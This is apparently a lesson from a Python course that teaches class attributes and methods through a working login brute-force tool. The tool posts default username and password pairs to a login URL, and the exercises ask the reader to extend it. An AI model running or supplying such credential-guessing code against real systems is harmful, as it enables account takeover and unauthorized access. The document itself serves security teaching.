
# 02_attributes_methods.md

## 🔓 Real-World Cybersecurity Use Case

Imagine you're developing a **login brute-force tool**. You want to store each target's login page and a list of usernames/passwords. You'll also need methods to try credentials and store results.  
Attributes represent the tool's settings; methods represent the tool's actions.

---

## 💻 Python Code First – Brute Force Tool Example

```python
import requests

class LoginBruteForcer:
    def __init__(self, target_url):
        self.target_url = target_url  # attribute
        self.successful_logins = []   # attribute

    def try_login(self, username, password):  # method
        response = requests.post(self.target_url, data={'username': username, 'password': password})
        if "Welcome" in response.text:
            print(f"[+] Login successful: {username}:{password}")
            self.successful_logins.append((username, password))

    def run(self, wordlist):  # method
        for username, password in wordlist:
            self.try_login(username, password)

# Example usage
if __name__ == "__main__":
    wordlist = [('admin', 'admin123'), ('admin', '123456'), ('root', 'toor')]
    bruteforcer = LoginBruteForcer("http://example.com/login")
    bruteforcer.run(wordlist)
```

---

## 📘 Concept Explanation

### What Are Attributes?
- Attributes are **variables attached to an object**.
- They store information about the object’s current state.

In our example:
- `target_url` is an attribute that holds the login page URL.
- `successful_logins` stores valid login combinations found.

### What Are Methods?
- Methods are **functions defined inside a class**.
- They describe what the object can do.

In our tool:
- `try_login()` is a method that tries a username/password.
- `run()` is a method that loops through credentials.

---

## 🛠 Offensive Security Application

Attributes and methods are key when building:
- Brute-force tools (store targets, handle attempts)
- Port scanners (track open ports, define scan logic)
- Exploit chains (track vulnerable targets, run steps)

They help **organize logic cleanly**:
- Attributes = tool configuration or state (IP, ports, credentials)
- Methods = actions your tool performs (scan, send, fuzz, etc.)

---

## 🔐 Connection to SOLID

This strengthens the **Single Responsibility Principle (SRP)**:
> “Each method should have one job.”

- `try_login()` only tries one login
- `run()` handles the loop
- `__init__` sets up the object

Keeping logic **modular** helps you test and reuse code.

---

## ✅ Exercises / Next Steps

1. ➕ Add an attribute to limit failed login attempts.
2. 📊 Add a method to print a summary report of results.
3. 🔐 Extend the tool to support a login form with custom field names (e.g., `user`, `pass`).

---

## 🔗 Related Modules

- Previously: `01_class_object.md` – this builds on the basics of classes and objects.
- Coming Up: `03_encapsulation.md` – we’ll protect internal attributes like `successful_logins` from being modified externally.
